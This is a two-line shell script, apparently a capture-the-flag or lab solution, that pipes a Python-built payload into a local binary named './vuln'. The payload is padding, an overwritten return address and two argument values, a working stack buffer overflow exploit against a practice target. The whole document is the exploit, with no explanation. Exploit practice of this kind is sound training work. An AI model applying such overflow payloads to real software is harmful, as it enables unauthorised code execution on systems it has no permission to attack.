#!/bin/sh
python -c 'import struct as s; print "A" * 0xbc + s.pack("<I", 0x080485e6) + "A" * 4 + s.pack("<II", 0xdeadbeef, 0xc0ded00d)' | ./vuln
